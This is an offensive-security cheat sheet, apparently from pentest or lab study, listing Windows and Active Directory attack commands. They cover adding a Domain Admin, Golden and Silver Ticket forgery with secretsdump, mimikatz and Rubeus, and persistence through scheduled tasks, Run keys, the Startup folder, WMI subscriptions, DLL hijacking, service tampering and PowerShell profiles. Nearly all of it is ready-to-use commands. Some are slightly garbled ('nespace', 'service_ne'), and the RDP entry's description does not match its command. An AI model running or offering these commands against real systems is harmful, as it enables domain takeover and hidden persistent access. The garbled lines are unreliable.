### **1. Adding a User to Domain Admins**

- **Command:**
  ```plaintext
  net group "domain admins" myuser /add /domain
  ```
  - **Use Case:** Adds `myuser` to the Domain Admins group, granting administrative privileges across the domain.

---

### **2. Golden Ticket Attack**

- **Overview:**
  - A Golden Ticket is a forged TGT that provides unrestricted access to any resource within the domain for an extended period.

- **Commands:**
  1. **Obtain KRBTGT Hash:**
     - **Command:**
       ```bash
       secretsdump.py -just-dc-ntlm <domain_admin>@<dc_ip>
       ```
  2. **Generate Golden Ticket:**
     - **Command:**
       ```plaintext
       mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt"
       ```

---

### **3. Silver Ticket Attack**

- **Overview:**
  - A Silver Ticket is created using a service account's NTLM hash, allowing access to specific services without alerting the Domain Controller.

- **Command:**
  ```plaintext
  Rubeus.exe asktgt /user:jon.snow /rc4:<ntlm_hash> /domain:north.sevenkingdoms.local /outfile:c:\users\arya.stark\desktop\jontgt.kirbi /ptt
  ```

---

### **4. Scheduled Task**

- **Command:**
  ```plaintext
  schtasks /create /tn "SystemUpdate" /tr "cmd.exe /c <payload>" /sc onstart /ru SYSTEM
  ```
  - **Use Case:** Creates a scheduled task that runs a payload with SYSTEM privileges on system startup.

---

### **5. Startup Folder**

- **Command:**
  ```plaintext
  copy <payload> "C:\Users\<userne>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
  ```
  - **Use Case:** Places a payload in the startup folder to run every time the user logs in.

---

### **6. Registry Run Key**

- **Command:**
  ```plaintext
  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Update /t REG_SZ /d "C:\path\to\payload.exe"
  ```
  - **Use Case:** Adds a payload to the registry's Run key to execute at user login.

---

### **7. WMI Event Subscription**

- **Command:**
  ```plaintext
  wmic /nespace:\\root\subscription PATH __EventFilter CREATE ne="Filter", Eventnespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
  ```
  - **Use Case:** Sets up a WMI event to trigger a payload based on system events.

---

### **8. DLL Hijacking**

- **Command:**
  ```plaintext
  copy <malicious.dll> "C:\Program Files\VulnerableApp\"
  ```
  - **Use Case:** Replaces a legitimate DLL with a malicious one to be loaded by a vulnerable application.

---

### **9. Service Manipulation**

- **Command:**
  ```plaintext
  sc config <service_ne> binpath= "cmd.exe /c <payload>"
  ```
  - **Use Case:** Modifies a service to execute a malicious payload.

---

### **10. PowerShell Profile**

- **Command:**
  ```plaintext
  echo "Start-Process 'C:\path\to\payload.exe'" >> $PROFILE
  ```
  - **Use Case:** Adds a command to the PowerShell profile to execute a payload every time PowerShell is launched.

---

### **11. Lateral Movement via RDP**

- **Command:**
  ```plaintext
  reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389
  ```
  - **Use Case:** Ensures RDP is enabled and accessible for persistent remote access.
